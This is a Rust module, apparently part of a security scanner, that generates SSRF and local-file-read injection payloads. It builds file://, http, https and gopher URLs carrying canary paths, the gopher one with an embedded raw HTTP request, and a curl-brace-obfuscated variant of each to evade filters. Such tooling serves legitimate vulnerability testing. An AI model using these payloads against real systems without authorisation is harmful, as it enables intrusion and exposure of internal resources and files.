use super::Injector;

pub fn curl_obf(v: &Vec<u8>) -> Vec<u8> {
    let mut out = vec![];
    for x in v {
        out.extend(b"{");
        out.push(*x);
        out.extend(b"}");
    }
    return out;
}

pub fn file_proto(file: &Vec<u8>) -> Vec<u8> {
    let mut out = b"file://".to_vec();
    out.extend(file);
    out
}
pub fn http_proto(addr: &Vec<u8>, canary: Vec<u8>) -> Vec<u8> {
    let mut out = b"http://".to_vec();
    out.extend(addr);
    out.extend(b"/");
    out.extend(canary);
    out
}
pub fn https_proto(addr: &Vec<u8>, canary: Vec<u8>) -> Vec<u8> {
    let mut out = b"https://".to_vec();
    out.extend(addr);
    out.extend(b"/");
    out.extend(canary);
    out
}
pub fn gopher_proto(addr: &Vec<u8>, canary: Vec<u8>) -> Vec<u8> {
    let mut out = b"gopher://".to_vec();
    out.extend(addr);
    out.extend(b"/_GET%20/");
    out.extend(canary);
    out.extend(b"%20HTTP/1.1%0D%0A%0D%0A".to_vec());
    out
}

pub fn inj(inj: &Injector, mut ith: u64, n: u64) -> Result<Vec<u8>, u64> {
    if let Some(file) = &inj.file {
        if ith == n {
            return Ok(file_proto(file));
        }
        ith += 1;
        if ith == n {
            return Ok(curl_obf(&file_proto(file)));
        }
        ith += 1;
    } 
    if let Some(addr) = &inj.addr() {
        if ith == n {
            return Ok(http_proto(addr, inj.canary(ith)));
        }
        ith += 1;
        if ith == n {
            return Ok(curl_obf(&http_proto(addr, inj.canary(ith))));
        }
        ith += 1;

        if ith == n {
            return Ok(https_proto(addr, inj.canary(ith)));
        }
        ith += 1;
        if ith == n {
            return Ok(curl_obf(&https_proto(addr, inj.canary(ith))));
        }
        ith += 1;

        if ith == n {
            return Ok(gopher_proto(addr, inj.canary(ith)));
        }
        ith += 1;
        if ith == n {
            return Ok(curl_obf(&gopher_proto(addr, inj.canary(ith))));
        }
        ith += 1;
    }
    Err(ith)
}
